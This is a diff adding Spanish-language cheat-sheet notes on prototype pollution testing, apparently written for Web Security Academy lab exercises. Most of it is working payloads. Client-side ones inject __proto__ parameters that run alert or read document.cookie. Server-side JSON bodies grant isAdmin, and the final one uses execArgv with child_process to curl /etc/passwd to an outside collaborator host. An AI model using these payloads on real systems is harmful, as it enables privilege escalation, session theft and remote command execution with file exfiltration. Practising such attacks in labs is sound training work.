@@ -1,0 +1,69 @@
+/-/-/-/--/-/-/-/-/-/
+/-/-¿Qué probar?/-/
+/-/-/-/--/-/-/-/-/-/
+Buscar en JS estas funciones
+Object.assign()
+_.merge() (de Lodash o similares)
+Object.setPrototypeOf()
+
+en json probar 
+,
+"__proto__":{
+"polluted":loquesea}
+console.log({}.polluted); // Si devuelve "injected_value", la web es vulnerable
+
+Mirar Object.prorotype a ver que se inyecta
+/?__proto__[value]=sexo
+/?__proto__[value]=data:,alert(1);
+Probar DOM INVADER exploit
+
+
+Nos fijamos en una de las funciones del JS
+Probamos con DOM NVADER si se inyectan
+miramos en consola con Object.prorotype    
+/?__proto__[transport_url]=data:,alert(1);
+
+Miramos el JS, hay una función que la trata como entrada de JS
+/?__proto__.sequence=alert(1)-
+
+
+Miramos en el JS las cadenas de constructor o prototype que evita
+/?__pro__proto__to__[transport_url]=data:,alert(2);
+
+
+Nos damos cuenta que en el DOM INVADEr hay un payload parecido
+buscar Callback o HitCallback en JS
+<script>
+location = "https://0a6e002d03bec47681156c4e00c400e0.web-security-academy.net/#constructor[prototype][hitCallback]=alert%28document.cookie%29";
+</script>
+
+
+Si vemos un JSon que nos da en el response un isAdmin y hay un NodeJs
+Ejemplo de Json, poner lo del final
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"U","sessionId":"feSZOQ3PGJbyCI9CbxWNAxbuCHwyGua1",
+"__proto__":{"isAdmin":true
+}}
+
+Probamos una técnica no destructiva, simplemente cambiar unn valor forzando el error
+CAMBIAR
+,
+"__proto__":{
+"status":true}
+
+COMPROBAR
+,
+"__proto__":{
+"status":rset=UT}
+
+Ya que capa __proto__
+,
+"constructor":{
+"prototype":{
+"isAdmin":true}}
+
+Ejecutar comandos pulsar en run maintance en /admin
+,
+"__proto__":{
+"execArgv":[ "--eval=require('child_process').execSync('curl --data @/etc/passwd collaborator.com')" ],
+"isAdmin": true
+}
